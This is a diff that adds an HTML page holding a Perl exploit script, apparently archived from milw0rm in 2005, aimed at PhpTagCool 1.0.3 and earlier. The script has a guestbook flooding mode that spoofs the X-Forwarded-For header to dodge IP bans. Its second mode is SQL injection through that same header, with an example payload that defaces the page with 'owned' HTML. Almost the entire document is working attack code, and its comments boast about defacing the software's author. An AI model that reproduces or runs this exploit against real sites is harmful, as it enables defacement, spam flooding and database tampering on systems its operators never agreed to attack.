@@ -1,0 +1,129 @@
+<html>
+<head>
+<title>PhpTagCool <= 1.0.3 SQL Injection Attacks Exploit</title>
+<pre>
+#!/usr/bin/perl
+##  PhpTagCool Zatueritor 1.0
+##  Copyright: Megabyte www.mbytesecurity.org
+##  Greetz: Rootbox for discovering the forwarded-for issue
+##  Te amo Pandora
+##  Crashcool,fuiste defaceado por un bug de tu propia programacion,ahora que inventaras?
+ 
+use IO::Socket;
+ 
+$x = 0;
+ 
+print q(
+PhpTagCool Zatueritor 1.0
+by Megabyte
+ 
+);
+print q(Host |sin http://www.| );
+$host = &lt;STDIN&gt;;
+chop ($host);
+ 
+print q(Ruta |ejemplo. /phptagcool/ o /| );
+$pth = &lt;STDIN&gt;;
+chop ($pth);
+ 
+print q(Tipo de Atake |1 = Posteo Masivo, 2 = Injeccion SQL| );
+$type = &lt;STDIN&gt;;
+chop ($type);
+ 
+## The Flood Attack
+if($type == 1){
+ 
+ 
+while($x != 255)
+{
+ 
+ 
+$nick = &quot;nick=megabyte&quot;;
+ 
+## We generate our own ip address so we won't be banned  :) 
+$ip = &quot;127.0.0&quot; . &quot;$x&quot;;
+ 
+ 
+$postit = &quot;$nick&quot;.&quot;&amp;url=http%3A%2F%2Fwww.mbytesecurity.org&amp;mensaje=FloodingLam
+eTag&amp;Submit=Enviar&quot;;
+ 
+ 
+$lrg = length $postit;
+ 
+ 
+my $sock = new IO::Socket::INET (
+                                 PeerAddr =&gt; &quot;$host&quot;,
+                                 PeerPort =&gt; &quot;80&quot;,
+                                 Proto =&gt; &quot;tcp&quot;,
+                                );
+die &quot;\nNo se pudo conectar  :(  $!\n&quot; unless $sock;
+ 
+## We Fake the X-Forwarded-For header,so we can post with multiple ip's
+print $sock &quot;POST $pth&quot;.&quot;mensajes.php HTTP/1.1\n&quot;;
+print $sock &quot;Host: $host\n&quot;;
+print $sock &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwav
+e-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\n&quot;;
+print $sock &quot;Referer: $host\n&quot;;
+print $sock &quot;Accept-Language: en-us\n&quot;;
+print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $sock &quot;Accept-Encoding: gzip, deflate\n&quot;;
+print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox
+/1.0.4\n&quot;;
+print $sock &quot;X-Forwarded-For: $ip\n&quot;;
+print $sock &quot;Connection: Keep-Alive\n&quot;;
+print $sock &quot;Cache-Control: no-cache\n&quot;;
+print $sock &quot;Content-Length: $lrg\n\n&quot;;
+print $sock &quot;$postit\n&quot;;
+close($sock);
+ 
+ 
+syswrite STDOUT, &quot;.&quot;;
+ 
+ 
+$x++;
+}
+ 
+## The SQL injection attack  :) 
+}
+elsif ($type == 2){
+ 
+print q(Inyeccion a ejecutar Ejemplo 127.0.0.1'),('&lt;h1&gt;owned&lt;/h1&gt;','http://mbytesecurity.
+org','leim','hoy','11 );
+$sql = &lt;STDIN&gt;;
+chop ($sql);
+ 
+ 
+ 
+my $sock = new IO::Socket::INET (
+                                 PeerAddr =&gt; &quot;$host&quot;,
+                                 PeerPort =&gt; &quot;80&quot;,
+                                 Proto =&gt; &quot;tcp&quot;,
+                                );
+die &quot;\nNo se pudo conectar  :(  $!\n&quot; unless $sock;
+ 
+ 
+print $sock &quot;POST $pth&quot;.&quot;mensajes.php HTTP/1.1\n&quot;;
+print $sock &quot;Host: $host\n&quot;;
+print $sock &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q
+=0.8,image/png,*/*;q=0.5\n&quot;;
+print $sock &quot;Referer: $host\n&quot;;
+print $sock &quot;Accept-Language: en-us\n&quot;;
+print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
+print $sock &quot;Accept-Encoding: gzip, deflate\n&quot;;
+print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox
+/1.0.4\n&quot;;
+print $sock &quot;Connection: Keep-Alive\n&quot;;
+print $sock &quot;Cache-Control: no-cache\n&quot;;
+print $sock &quot;Content-Length: $lrg\n\n&quot;;
+print $sock &quot;X-Forwarded-For: $sql\n&quot;;
+close($sock);
+ 
+}else{
+ 
+	die &quot;Solo hay 2 opciones IMBECIL\n&quot;;
+}
+
+# milw0rm.com [2005-09-11]
+</pre>
+</html>
+
